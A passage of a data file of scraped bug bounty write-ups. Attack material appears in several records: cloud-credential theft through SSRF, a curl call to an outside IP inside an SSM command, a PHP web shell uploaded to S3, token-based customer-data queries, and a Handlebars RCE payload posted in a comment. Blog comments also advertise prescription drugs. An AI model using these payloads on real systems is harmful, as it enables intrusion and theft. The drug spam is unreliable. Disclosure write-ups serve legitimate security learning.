https://www.slideshare.net/HackIT-ukraine/15-technique-to-exploit-file-upload-pages-ebrahim-hegazy Follow Infosec Write-ups for more such awesome write-ups. InfoSec Write-ups A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub… medium.com Bug Bounty Infosec Race Condition Rce File Upload -- -- 2 Follow Published in InfoSec Write-ups 67K followers · Last published 18 hours ago A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow Written by YoKo Kho 1.3K followers · 38 following Independent | OSCP, CRTO, eWPTX, eCPTX | https://twitter.com/YoKoAcc | https://bugcrowd.com/YokoKho | https://leanpub.com/bughunting101 (Bahasa) Free! Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/cesppa/escalating-ssrf-to-rce-f28c482eb8b9", "title": "Escalating SSRF to RCE. Escalating SSRF to RCE in AWS Elastic… | by Youssef A. Mohamed | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/cesppa/escalating-ssrf-to-rce-f28c482eb8b9. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nEscalating SSRF to RCE. Escalating SSRF to RCE in AWS Elastic… | by Youssef A. Mohamed | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Escalating SSRF to RCE Youssef A. Mohamed 5 min read · Mar 12, 2019 -- 2 Listen Share Case: AWS Elastic Beanstalk Press enter or click to view image in full size Hello Pentesters, I’m Youssef A. Mohamed aka GeneralEG Security Researcher @ CESPPA , Cyber Security Engineer @ Squnity and SRT Member @ Synack Press enter or click to view image in full size Today I’m going to share a new juicy vulnerability with you as usual. This issue found in a private client so let’s call it redacted.com Exploring the scope: While enumerating the client’s domain for subdomains. I’ve found subdomain [docs] I came out to this subdomain [docs.redact.com] Finding Out-of-band resource load: The [docs] subdomain was showing some documentations and kind of statistics While clicking on a statistic’s photo I saw kind of weird but not a magical Link: Press enter or click to view image in full size the first thing that came into my mind is to change the [url]’s value to generaleg0x01.com Then I noticed the [mimeType] parameter so edited the link and changed the values to be like this: https://docs.redact.com/report/api/v2/help/asset?url=https://generaleg0x01.com&mimeType=text/html&t=REDACTED.JWT.TOKEN&advertiserId=11 Press enter or click to view image in full size Until now it just [Out-of-band resource load] Verifying SSRF: While checking the requests/responses in my BurpSuite noticed Response Header [X-Amz-Cf-Id] So, I’ve figured out that they are on AWS Environment. We need to make sure that SSRF is working well here. So as we know [169.254.169.254] is the EC2 instance local IP address. Let’s try to access to the meta-data folder by navigating to [/latest/meta-data/]. Press enter or click to view image in full size SSRF Confirmed. Surfing on the EC2 Environment: Let’s check our current role by navigating to [/latest/meta-data/iam/security-credentials/]. It’s aws-elasticbeanstalk-ec2-role Press enter or click to view image in full size What’s AWS Elastic Beanstalk? AWS Elastic Beanstalk, is a Platform as a Service (PaaS) offering from AWS for deploying and scaling web applications developed for various environments such as Java, .NET, PHP, Node.js, Python, Ruby and Go. It automatically handles the deployment, capacity provisioning, load balancing, auto-scaling, and application health monitoring. Grabbing the needed data: 1) Go to [/latest/meta-data/iam/security-credentials/aws-elasticbeanstalk-ec2-role/] to get [AccessKeyId, SecretAccessKey, Token] Press enter or click to view image in full size 2) Go to [/latest/dynamic/instance-identity/document/] to get [instanceId, accountId, region] Press enter or click to view image in full size Configuring AWS Command Line Interface: Open your terminal: ~# apt install awscli ~# export AWS_ACCESS_KEY_ID=AccessKeyId ~# export AWS_SECRET_ACCESS_KEY=SecretAccessKey ~# export AWS_DEFAULT_REGION=region ~# export AWS_SESSION_TOKEN=Token Press enter or click to view image in full size to get the [UserID] ~# aws sts get-caller-identity Press enter or click to view image in full size SSRF exploited well, Now let’s explore further possibilities to escalate it to something Bigger “RCE”. Escalating SSRF to RCE: I went to try some potential exploitation scenarios. Escalating via [ssm send-command] fail After a few pieces of research tried to use AWS Systems Manager [ssm] command. The role is not authorized to perform this command. I was hoping to escalate it with aws ssm send-command. ~# aws ssm send-command — instance-ids “instanceId” — document-name “AWS-RunShellScript” — comment “whoami” — parameters commands=’curl 128.199.xx.xx:8080/`whoami`’ — output text — region=region An error occurred (AccessDeniedException) when calling the SendCommand operation: User: arn:aws:sts::765xxxxxxxxx:assumed-role/aws-elasticbeanstalk-ec2-role/i-007xxxxxxxxxxxxxx is not authorized to perform: ssm:SendCommand on resource: arn:aws:ec2:us-east-1:765xxxxxxxxx:instance/i-00xxxxxxxxxxxxxx Press enter or click to view image in full size Escalating via [SSH] fail SSH port is closed. I was hoping to escalate it with the famous scenario: “creating a RSA authentication key pair (public key and private key), to be able to log into a remote site from the account, without having to type the password.” Press enter or click to view image in full size Escalating via [Uploading Backdoor] Success Trying to read the [S3 Bucket] content: tried running multiple commands using AWS CLI to retrieve information from the AWS instance. However, access to most of the commands were denied due to the security policy in place. ~# aws s3 ls An error occurred (AccessDenied) when calling the ListBuckets operation: Access Denied Press enter or click to view image in full size After a few pieces of research figured that the managed policy “AWSElasticBeanstalkWebTier” only allows accessing S3 buckets whose name start with “elasticbeanstalk”. In order to access the S3 bucket, we will use the data we grabbed earlier with the following format: elasticbeanstalk-region-account-id Now, the bucket name is “elasticbeanstalk-us-east-1–76xxxxxxxx00”. Let’s listed bucket resources for “elasticbeanstalk-us-east-1–76xxxxxxxx00” in a recursive manner to perform this long-running task using AWS CLI: ~# aws s3 ls s3://elasticbeanstalk-us-east-1–76xxxxxxxx00/ — recursive Press enter or click to view image in full size Now, Let’s try to upload a Backdoor! ~# cat cmd.php <?php if(isset($_REQUEST['cmd'])){ echo \"<pre>\"; $cmd = ($_REQUEST['cmd']); system($cmd); echo \"</pre>\"; die; }?> Press enter or click to view image in full size ~# aws s3 cp cmd.php s3://elasticbeanstalk-us-east-1–76xxxxxxxx00/ Press enter or click to view image in full size upload: ./cmd.php to s3://docs.redact.com/cmd.php Press enter or click to view image in full size And here we got a successful RCE! Press enter or click to view image in full size In a nutshell: You can escalate Server-Side Request Forgery to Remote Code Execute in many ways but it’s depending on your target’s Environment. Happy Hacking! AWS Rce Bugbounty Cesppa Generaleg -- -- 2 Written by Youssef A. Mohamed 395 followers · 47 following Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@spazzyy/bug-bounty-101-always-check-the-source-code-1adaf3f59567", "title": "Bug Bounty 101 — Always Check The Source Code | by Spazzy | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@spazzyy/bug-bounty-101-always-check-the-source-code-1adaf3f59567. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nBug Bounty 101 — Always Check The Source Code | by Spazzy | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Bug Bounty 101 — Always Check The Source Code Spazzy 1 min read · Feb 23, 2019 -- Listen Share Never miss out on checking out the source code! In a recent bounty program for a company I can’t disclose, I found a hilarious information disclosure that is a great example of why you should always check out the source code. This vulnerability sat inside a enrollment portal that was meant for people to redeem discounts that worked for affiliated companies. It required you to enter any email, and the account phone number. In the next step, it required some extra steps of verification. One being, the last 4 of the SSN which turned out not to have a request limit….oops? LOL This vulnerability started out being no request limit turning into an information disclosure, as I reported this to the company soon after checking to see if they fixed it I happened to check out the source code on the next step. That’s when I found more that adds to the information disclosure! It included a HTML comment that I originally believed to only contain filler info…but no it actually was information of the account. It contained the account number and the answer to one of the extra verification steps! Crazy right? I couldn’t believe a company this large, to have something so simple. With this someone with malicious intent would be able to complete the verification, know the customers last 4 of the ssn, and the extra verification info that included the answer in the source code. Simple but toxic, proves never miss out looking at changes in the source code! Bug Bounty Vulnerability Hacking Security HTML -- -- Written by Spazzy 32 followers · 2 following A technology enthusiast, mainly spend my time on security research. I’ve reported security issues to few companies, some being AT&T, HP, Western Union No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@jonathanbouman/leaked-salesforce-api-access-token-at-ikea-com-132eea3844e0", "title": "Leaked Salesforce API access token at IKEA.com | by Jonathan Bouman | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@jonathanbouman/leaked-salesforce-api-access-token-at-ikea-com-132eea3844e0. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nLeaked Salesforce API access token at IKEA.com | by Jonathan Bouman | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Leaked Salesforce API access token at IKEA.com Jonathan Bouman 6 min read · Apr 4, 2019 -- 4 Listen Share Press enter or click to view image in full size Proof of concept Background Previously we discussed a Local File Inclusion bug at IKEA.com , the bug was quite complicated and showed us that you have to think out of the box in order to exploit it. This time we will learn how a relative simple and easy to spot bug can have a high impact; a potential data leak of customer data. Plenty of high profile brands use Salesforce for their Customer Relationship Management (CRM); it’s perfect for customer care support. Furthermore it’s real easy to implement their software on your own website by using their API. IKEA.com As mentioned in our previous bug report , IKEA is a nice brand with a proper responsible disclosure statement. So we’re safe to help them find bugs, maybe even in exchange for a reward. Time to search for bugs! Finding targets As always we start with a search for interesting sub domains. A good start is to use Amass , it will query different public available data sets and gives you a nice list of sub domains back. However searching manually in different data sets is never a bad idea; search the social media accounts of the brand for interesting sub domains and URLs. Open Facebook.com, Twitter.com and LinkedIn.com; search the brand name, search for domain names and see what you end up with. IKEA Spain Tweet IKEA Customer care The Tweet deeplinks to https://social.ikea.es/KAirva which resolves to https://ww9.ikea.com/es/es/contacto/formulario.php?cid=a1:of%7Ca2:es%7Ca3:csc_social%7Ccc:915 a simple page with a web form. Press enter or click to view image in full size Forms always deserve a closer look; are there any query parameters reflected in the source ( reflected XSS ), are you able to upload arbitrary files ( stored XSS ) or are you able to inject HTML code in one of the fields, code that is being executed in the web interface of the administrator ( blind XSS )? Query parameters A good start is to search with the Param Miner (Burp Suite plugin) for query parameters that are being reflected in the page source. Found a parameter? Put the request in the Burp Suite Repeater and check if you can create a reflected XSS bug. Long story short: no luck today, no XSS vulnerable reflected parameters are being found on this page. The file upload The next thing we check is the file upload; where do upload files end up and are we able to upload our own how HTML files to a public IKEA url? Lets open the Chrome DevTools , select a file, press the upload button and watch the network requests being made. Of course you can also use the Burp Suite Proxy History to see the requests. This time we discover something special. Our browser actually makes quite a few requests in order to upload a simple file. Let’s have a closer look at these requests, what is happening? Press enter or click to view image in full size Three requests are needed for a simple file upload The first request https://ww9.ikea.com/es/en/contact/sendFormS4G.php creates a Salesforce Object ID for the ticket and returns us the ID . The second request https://ww9.ikea.com/es/en/contact/loginS4G.php gives returns a Salesforce API access token The third request https://ww9.ikea.com/es/en/contact/sendAttachmentS4G.php uploads the file to the Object ID returned by the first request, using the Salesforce API access token from the second request. That looks quite cumbersome, making three requests for a simple upload, but if it works it works. What about the API access token that is being shared with our browser? Does it only has access to our Salesforce object ID or can we use it to access other objects as well? We may use this access token to make requests directly to the Salesforce REST API. Salesforce documentation Let’s open the Salesforce REST API documentation : - How to use the access token in our requests - How to check which objects we can access - How to create a list output of a specific object type . Salesforce REST API We are able to list the different type of objects and our access permissions by requesting the following URL: curl https://yourInstance.salesforce.com/services/data/v37.0/sobjects/ -H \"Authorization: Bearer token\" Press enter or click to view image in full size We can access,search, create and delete all the account objects. This means we may have a potential customer data leak. The output from above is a small snippet of the 389kb JSON file being returned. It contains 465 different object types; from AuthConfigs till Emailmessages , for most we are allowed to query and retrieve them. Mmm. What about customer data? During bug bounties you want to show the impact of a bug, but at the same time you need to be responsible . That means that you need to limit the amount of data you request, don’t dump the full database, just a few records is enough to show the impact. Lets create a small list of 25 customers with their names and phone numbers. We do this by requesting a list of users from an account. curl https://eu15.salesforce.com/services/data/v43.0/sobjects/Account/listviews/00B24000003oGRNEA2/results -H “Authorization: Bearer 00D24XXXXXXXXXXXXXX” -o poc1.json Press enter or click to view image in full size Output of poc1.json: definitions of the columns A snippet of the output, name and phone is censored from the screenshot We just proved that this bug may lead to a customer data leak, so it’s time to write the report and inform IKEA. Conclusion IKEA uses Salesforce for some of their customer care support forms on IKEA.com. In one of those web forms we were able to upload files to their Salesforce instance. IKEA shared their Salesforce API access token with our browser in order to do this. This shared access token was not restricted to only our own support ticket, but it gave access to other customer data as well; a potential customer data leak is the result. This learns us that whenever we run into Salesforce access tokens we should check their access permissions by making requests to the external REST API of Salesforce. Solutions - Restrict access permissions of the shared access token - Don’t share any access tokens with a visitor, handle the file upload server side. Reward € 250 Timeline 18–09–18 Discovered bug, reported to IKEA through Zerocopter 20–09–18 Bug confirmed by Zerocopter 20–09–18 Bug confirmed by IKEA 21–09–18 IKEA fixed the bug and revoked the API key 21–09–18 Fix confirmed 24–09–18 Requested to coordinate the disclosure of the bug 25–09–18 IKEA informed me I can’t disclose the bug because it affects customer data and investigation of the impact is not finished yet 25–09–18 Requested to update me when the investigation is finished 25–09–18 IKEA requested me to contact my contact person at IKEA for further updates 13–10–18 Requested my contact person at IKEA for coordination and updates 15–10–18 IKEA contact person informed me that investigation is still going on 27–11–18 Requested update 28–11–18 IKEA contact person informed me that investigation is still going on 13–02–19 Requested update 14–02–19 IKEA requested to read the draft of this blog before I publish it 14–02–19 Informed IKEA that I scheduled to write this blog on 21–2–19 28–02–19 Wrote this blog and shared draft with IKEA 01–03–19 IKEA requested me to wait for a few weeks before I publish the report 02–04–19 IKEA informed me I’m allowed to disclose this report 04–04–19 Published this report IKEA Bug Bounty Hacking Security Salesforce -- -- 4 Written by Jonathan Bouman 2.6K followers · 38 following Medical doctor / Web developer / Security researcher - https://Protozoan.nl Responses ( 4 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html", "title": "Handlebars template injection and RCE in a Shopify app", "friendly_explanation": "This is a bug bounty writeup from https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHandlebars template injection and RCE in a Shopify app Skip to main content Search This Blog Mahmoud Gamal - Security Blogs Handlebars template injection and RCE in a Shopify app Get link Facebook X Pinterest Email Other Apps April 04, 2019 TL;DR We found a zero-day within a JavaScript template library called handlebars and used it to get Remote Code Execution in the Shopify Return Magic app. The Story: In October 2018, Shopify organized the HackerOne event \"H1-514\" to which some specific researchers were invited and I was one of them. Some of the Shopify apps that were in scope included an application called \"Return Magic\" that would automate the whole return process when a customer wants to return a product that they already purchased through a Shopify store. Looking at the application, I found that it has a feature called Email WorkFlow where shop owners can customize the email message sent to users once they return a product. Users could use variables in their template such as {{order.number}} , {{email}} ..etc. I decided to test this feature for Server Side Template injection and entered {{this}} {{self}} then sent a test email to myself and the email had [object Object] within it which immediately attracted my attention. So I spent a lot of time trying to find out what the template engine was, I searched for popular NodeJs templates and thought the template engine was mustache (wrong), I kept looking for mustache template injection online but nothing came up as Mustache is supposed to be a logicless template engine with no ability to call functions which made no sense as I was able to call some Object attributes such as {{this.__proto__}} and even call functions such as {{this.constructor.constructor}} which is the Function constructor. I kept trying to send parameters to this.constructor.constructor() but failed. I decided that this was not vulnerable and moved on to look for more bugs. Then the fate decides that this bug needs to be found and I see a message from Shopify on the event slack channel asking researchers to submit their \"almost bugs\" so if someone found something and feels it's exploitable, they would send the bug to Shopify security team and if the team manages to exploit it the reporter will get paid as if they found it. Immediately I sent my submission explaining what I have found and at the impact section I wrote \"Could be a Server Side template injection that can be used to take over the server ¯\\_(ツ)_/¯\". Two months passed and I got no response from Shopify regarding my \"almost bug\" submission, then I was invited to another hacking event in Bali hosted by Synack. There I met the Synack Red Team and after the Synack event has ended, I was supposed to travel back to Egypt, but only 3 hours before the flight I decided to extended my stay for three more days then fly from Bali to Japan where I was supposed to participate in the TrendMicro CTF competition with my CTF team. Some of the SRT also decided to extend their stay in Bali. One of those was Matias so I contacted him to hangout together. After swimming in the ocean and enjoying the beautiful nature of Bali, we went to a restaurant for dinner where Matias told me about a bug he found in a bug bounty program that had something to do with JavaScript sandbox escape so we spent all night missing with objects and constructors, but unfortunately we couldn't escape the sandbox. I couldn't take constructors out of my head and I remembered the template injection bug I found in Shopify. I looked at the HackerOne report and thought that the template can't be mustache so I installed mustache locally and when I parsed {{this}} with mustache it actually returns nothing which is not the case with the Shopify application. I searched again for popular NodeJs template engines and I found a bunch of them, I looked for those that used curly brackets {{ }} for template expressions and downloaded them locally, one of the libraries was handlebars and when I parsed {{this}} it returned [object Object] which is the same as the Shopify app. I looked at handlebars documentation and found out that it's also supposed to not have much logic to prevent template injection attacks. But knowing that I can access the function constructor I decided to give it a try and see how I can pass parameters to functions. After reading the documentation, I found out that in handlebars developers can register functions as helpers in the template scope. We can pass parameters to helpers like this {{helper \"param1\" \"param2\" ...params}} . So the first thing I tried was {{this.constructor.constructor \"console.log(process.pid)\"}} but it just returned console.log(process.pid) as a string. I went to the source code to find out what was happening. At the runtime.js file, there was the following function: So what this function does is that it checks if the current object is of type 'function' and if so it just calls it using current.call(context) where context is the template scope, otherwise, it would just return the object itself. I looked further in the documentation of handlebars and found out that it had built in helpers such as \"with\", \"blockHelperMissing\", \"forEach\" ...etc After reading the source code for each helper, I had an exploitation in mind using the \"with\" helper as it is used to shift the context for a section of a template by using the built-in with block helper. So I would be able to perform curren.call(context) on my own context. So I tried the following: Basically that should pass console.log(process.pid) as the current context, then when the handlebars compiler reaches this.constructor.constructor and finds that it's a function, it should call it with the current context as the function argument. Then using {{#with this}} we call the returned function from the Function constructor and console.log(process.pid) gets executed. However, this did not work because function.call() is used to invoke a method with an owner object as an argument, so the first argument is the owner object and other arguments are the parameters sent to the function being called. So if the function was called like current.call(this, context) , the previous payload would have worked. I spent two more nights in Ubud then flew to Tokyo for the TrendMicro CTF. Again in Tokyo, I couldn't take objects and constructors out of my mind and kept trying to find a way to escape the sandbox. I had another idea of using Array.map() to call Function constructor on my context, but it didn't work because the compiler always passes an extra argument to any function I call which is an object containing the template scope which causes an error as my payload is considered a function argument not the function body. There seemed to be many possible ways to escape the sandbox but I had one big problem facing me which is that whenever a function is called within the template, the template compiler sends the template scope Object as the last parameter. For example, if I try to call something like constructor.constructor(\"test\",\"test\") , the compiler will call it like constructor.constructor(\"test\", \"test\", this) and this will be converted to a string by calling Object.toString() and the anonymous function created will be: which will cause an error. I tried many other things but still no luck, then I decided to open the JavaScript documentation for Object prototype and look for something that could help escape the sandbox. I found out that I could overwrite the Object.prototype.toString() function using Object .prototype. defineProperty() so that it calls a function that returns a user controlled string (my payload). Since I can't define functions using the template, all I have to do is to find a function that is already defined within the template scope and returns a user controlled input. For example, the following nodejs application should be vulnerable: test.js example.html Now if you run this template, console.log(process.pid) gets executed. I reported that to Shopify and mentioned that if there was a function within the scope that returns a user controlled string, it would have been possible to get RCE. Later, when I met Ibrahim (@the_st0rm) I told him about my idea and he told me that I can use bind() to create a new function that when called will return my RCE payload. From JavaScript documentation: The bind() method creates a new function that, when called, has its this keyword set to the provided value, with a given sequence of arguments preceding any provided when the new function is called. So now the idea is to create a string with whichever code I want to execute then bind its toString() to a function using bind() after that overwrite the Object.prototype.toString() function with that function. I spent a lot of time trying to apply this using handlebars templates, and eventually during my flight back to Egypt I was able to get a fully working PoC with no need to use functions defined in the template scope. Basically, what the template above does is: And when I tried it with Shopify, I got: Matias also texted me with an exploitation that he got which is much simpler than the one I used: With that said, I was able to get RCE on Shopify's Return Magic application as well as some other websites that used handlebars as a template engine. The vulnerability was also submitted to npm security and handlebars pushed a fix that disables access to constructors. The advisory can be found here: https://www.npmjs.com/advisories/755 In a nutshell You can use the following to inject Handlebars templates: Matias also had his own exploitation that is much simpler: Sorry for the long post, if you have any questions please drop me a tweet @Zombiehelp54 javascript nodejs sandbox Get link Facebook X Pinterest Email Other Apps Comments Mahmoud NourEldin April 4, 2019 at 11:13 AM Wow, very interesting blog Reply Delete Replies Reply Ahiezer April 4, 2019 at 1:22 PM Wow, fantastic word. Reply Delete Replies Reply NINAD SARANG April 6, 2019 at 10:18 AM nice finding. keep it up and keep posting such interesting issues Reply Delete Replies Reply Unknown April 7, 2019 at 8:05 PM the 2nd `{{#with (string.sub.apply 0 codelist)}}` its right? i think its should be `{{#with (this.apply 0 codelist)}}` Reply Delete Replies Mahmoud Gamal April 8, 2019 at 10:06 AM When the template compiler calls `apply()` it calls it on the current context, which in this case is `conslist[0]` which is the function constructor. So the way you call `apply()` doesn't really matter as the compiler will always call it on the current context. Matias used `#each` helper to shift the context for the section where `apply()` is called to the Function constructor. Btw it wouldn't have been possible to use `#with` as the with helper has the following line in its implementation: ``` if (_utils.isFunction(context)) { context = context.call(this); } ``` Basically what this does is that it checks if the context is a function, and if so it calls it and sets the context to whichever the function returns and in that case it will be an anonymous function returned by the function constructor rather than the Function constructor itself. In my exploit, I used `#blockHelperMissing` which does the same thing as `#with` except that it doesn't have the `_utils.isFunction(context)` check. Thanks for the question. Delete Replies Reply Mahmoud Gamal April 8, 2019 at 10:08 AM Your comment actually made me rethink about how I used `apply()` to call `bind()` in my initial exploit. I should have just used `bind()` the same way `apply()` was used (by shifting the context to `str.toString`). I've modified the exploit so it becomes more clean and easy to understand. Thanks again, Unknown person! Delete Replies Reply Balla May 26, 2020 at 5:49 AM Hi bro ... i found a company using handlebars with this same version ..can u send me your poc pls.. Delete Replies Reply Reply aymen azer April 8, 2019 at 2:35 PM السلام عليكم اخي انا اريد ان اصبح باحث امني ارجو ان تساعدني باجوبة بسيطة اريد مسدر لتعلم الثغرات البرمجية و ما هي لغات البرمجة التي احتاجها مع العلم اني عندي خلفية بسيطة في الجافا و c++ و الاسامبلي Reply Delete Replies Reply c0d3r.b0y June 10, 2019 at 3:26 AM Great finding. I have been recently finding a most secure template engine for node.js. I went through all and most of them are not sandboxed i.e. allows RCE easily. Is it fixed by handlebars ? Reply Delete Replies Reply Unknown July 16, 2019 at 5:34 AM it'll be nice to know which versions you've been referring to. RCE and XSS are not new to handlebars; were they using an outdated version? The link you referred to dates back to 2016, but your blog is in 2019. Great post btw! Thanks for sharing the details! Reply Delete Replies Mahmoud Gamal July 17, 2019 at 4:35 AM Versions of handlebars prior to 4.0.14 were vulnerable. Also, the link date is Feb 14th, 2019. Delete Replies Reply Reply MS Dynamics November 6, 2019 at 1:34 AM Thanks for posting. Its an Important topic to be read. Node JS training in hyderabad Reply Delete Replies Reply Data science November 28, 2019 at 1:49 AM This is great information and all relevant to me. I know when I engage with my readers on my blog posts, not only does it encourage others to leave comments, but it makes my blog feel more like a community – exactly what I want! Data Science Training in Hyderabad Hadoop Training in Hyderabad Java Training in Hyderabad Python online Training in Hyderabad Tableau online Training in Hyderabad Blockchain online Training in Hyderabad informatica online Training in Hyderabad devops online Training Reply Delete Replies Reply Priya December 14, 2019 at 3:17 AM I like your post very much. It is very much useful for everyone. I hope you will share more info about this. Node JS Online training Node JS training in Hyderabad Reply Delete Replies Reply rtusharkumarrastogi January 13, 2020 at 9:13 PM Welcome to the world of develop for MSK clinic.Best services provider in clinic. We provide genuine likes, followers and views to your Ultrasound guided injection. Regards Ultrasound guided injection Reply Delete Replies Reply Atul February 6, 2020 at 11:32 PM It was great experience after reading this. thanks for sharing such good stuff with us. JavaScript Institute in Delhi Reply Delete Replies Reply Pankaj February 7, 2020 at 2:15 AM This comment has been removed by the author. Reply Delete Replies Reply Buy Adderall Online-Adderall Online(Generic Adderall Online)) February 15, 2020 at 1:59 AM If you are feeling very depressed, have any panic disorders, Mental Stress, Anxiety Disorders visit the page and resolve all these problams and also New Year Offer begain offer limited period. Call Now For Buy Anxiety Medicines at very cheap price as compair to other dealer: +1-850-424-1335 Website: https://redditpharma.com/product/adderall-dosage/ https://redditpharma.com/product/ambien-dosage/ https://redditpharma.com/buy-alprazolam-online/ https://redditpharma.com/buy-hydrocodone-online/ https://redditpharma.com/buy-oxycodone-online/ https://redditpharma.com/buy-codeine-online/ Reply Delete Replies Reply seojonsmith February 24, 2020 at 1:08 AM Buy highest quality generic drugs, xanax online, SSD chemical solution Online, with fast & free services. Reply Delete Replies Reply Mexicanpills February 24, 2020 at 2:17 AM Amazing post. Thanks Buy Xanax Online Reply Delete Replies Reply Buy Adderall Online-Adderall Online(Generic Adderall Online)) February 26, 2020 at 4:11 AM topmedsreview: Provide the best information about anxiety, panic disorder, mental stress, depression, Hyperactivitys issuse. Top meds review is a social platform providing the best medical information, medicine review, and health guidance. Our website provides credible information, depth reference material about health subjects that matter to everyone. Anxiety Medicines Soma Addiction Types Of Xanax Bars Reply Delete Replies Reply SaiRangaTracedeals March 16, 2020 at 4:38 AM Thanks for sharing this article. Save you huge money & time. Download the Tracedeals Online Deals & Coupons&Sign In to get daily alerts from your favorite stores Offers,Coupons & Deals App Coupons and Offers App for Shopping Online Online Shopping Deals & Coupons App Online Shopping Offers & Coupons App Reply Delete Replies Reply dhramik March 22, 2020 at 12:12 AM The New Modern JavaScript Boot camp Course (2020) ProgrammingFree course Reply Delete Replies Reply kazzouzi May 20, 2020 at 4:56 AM to execute shell command use {{this.push \"return require('child_process').execSync('ls -la');\"}} Reply Delete Replies Reply mors July 4, 2020 at 9:11 PM عااااااااااااااااااااااااااااااااااااااش Reply Delete Replies Reply Add comment Load more... Post a Comment Popular posts from this blog SQL Injection: Utilizing XML Functions in Oracle and PostgreSQL to bypass WAFs February 13, 2023 TL;DR. In this blog post we will be discussing how built-in XML functions in Oracle and PostgreSQL database management systems can be used to bypass web application firewalls (WAFs). I will be presenting two real-life examples from private bug bounty programs where traditional methods for bypassing WAFs were not effective. Introduction It's really frustrating when you find a valid SQL injection vulnerability, but there isn't much to do because of a WAF blocking most of your payloads. Many WAF rules can be bypassed using character case switching, comments, splitting the payload into multiple parameters, double URL encoding and many other methods that depend on how the target application and the WAF handle your requests. However, In the cases we are discussing in this blog, I was not able to bypass the WAF using common WAF bypass methods. Case 1: SQL Injection in an Oracle database - WAF bypass using REGEXP_LIKE() and DBMS_XMLGEN.GETXMLTYPE() *This is a private bug bounty prog... Read more Exploiting Out Of Band XXE using internal network and php wrappers August 06, 2019 Hello hackers, A couple of weeks ago I tweeted about exploiting an out of band XXE vulnerability with a firewall blocking all outgoing requests including DNS lookups, so here is the full story: This is a private bug bounty program so I won't be mentioning who the vendor is. As usual during a hacking night while navigating the target application I came across an endpoint that took a parameter called xml but its value was encrypted. Later I found out that XML data sent to the backend is encrypted in the client side before sent in HTTP requests which means that XML data might not be properly validated in the backend, so I wanted to modify it to be able to inject my own XXE payload. So what I first tried was to find the JavaScript function used to encrypt the XML and do the same for my custom XML payload, however, the application's JavaScript was minimized with WebPack which made it very hard to read and trace functions. To avoid the hassle of finding the JavaScript encrypting... Read more Powered by Blogger Theme images by Michael Elkan Mahmoud Gamal Visit profile Archive 2023 1 February 1 2019 2 August 1 April 1 Handlebars template injection and RCE in a Shopify... 2018 1 July 1 2017 2 June 1 February 1 2015 2 November 1 September 1 Show more Show less Labels google hackerone hacking javascript nodejs sandbox security SQL Injection WAF WAF ByPass xss Show more Show less Report Abuse"}
{"source_url": "https://medium.com/@dortz/how-did-i-bypass-a-custom-brute-force-protection-and-why-that-solution-is-not-a-good-idea-4bec705004f9", "title": "Bypassing custom rate-limit protection in Mobile App | by INMUNE7 | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@dortz/how-did-i-bypass-a-custom-brute-force-protection-and-why-that-solution-is-not-a-good-idea-4bec705004f9. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nBypassing custom rate-limit protection in Mobile App | by INMUNE7 | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Bypassing custom rate-limit protection in Mobile App INMUNE7 8 min read · May 25, 2019 -- Listen Share Introduction In this article, I am going to talk about how I bypass rate-limit protection of the ACME corporation (a hypothetical name to maintain the non-disclosure agreement) with a custom implementation in native code for token generation. Later I will mention why this is not the best solution and I will recommend a better one. Prelude Brute force is one of the simple (also noisy) way to guess a password or something you want to know. Basically, in a brute force attack, an attacker tries a combination of passwords, strings, hex values, stack cookies, what you want to find. In this case, the ACME company implemented a custom solution to “stop” brute force attacks based in tokens using native code (.so library ) in an Android application. My client said: No one can read the library to generate a token because is compiled and is not readable. I say to myself : That’s not true, some one can decompile the source code of the library and read the assembler code to understand what the library does. So let’s get started. About the app The application is built for Android and it uses its own token implementation to prevent brute force attacks. Press enter or click to view image in full size Figure 1. Token validation process In Figure 1. We can see how the server handles the token, if the token is valid, the server returns 200, but if the token is invalid, the server returns 401. This token is put in the header and is validate per request. Press enter or click to view image in full size Figure 2. Request example In Figure 2 we can see an example of a request. In the X-ACME-Token header the application place the generated token. This token is used during the login process. The research Due to the kind of test, I perform this research without access to the source code or any information about the application, this is what we call “black-box testing”. I downloaded the APK of the application and opened it with JADX, after a lot of source code review I found the SEC class. This class defines a static segment to load the library with native code. Also is important to note that the application doesn’t obfuscate the code so was easy to JADX decompile the source code and show me in a readable format. Press enter or click to view image in full size Figure 3. Sec class ACME example Second … At this point, I know what is the name of the library so I extract the .so file using the ADB command from the Android emulated device. adb pull /data/data/com.acme.app/lib/libacme-lib.so . In this link I was talk about Genymotion and how prepare an Android lab if you are interested. This is the fun part. I need to do binary research if I want to understand what the file does because I don’t have the source code of the library. Let’s begin with the basic, I used xxd and file command to know more about the file. Press enter or click to view image in full size Figure 4. Basic research in a binary file At this point I know what the file is, the ELF header and the output of the file command confirm that the file is a shared library. The next thing I always do is open the file using the string command. Figure 5. Strings output command. …. very interesting method I found here. Java_com_acme_account_Sec_token Let’s open the library in IDA and examine that method. Figure 6. Library opened with IDA After a couple of hours reading assembler code to try to understand what the library does I decide to move forward with another option (more simplistic and cheaper for my client) maybe if I find some vulnerability in the Login process I can generate my own token… But wait …. something comes to my mind and it 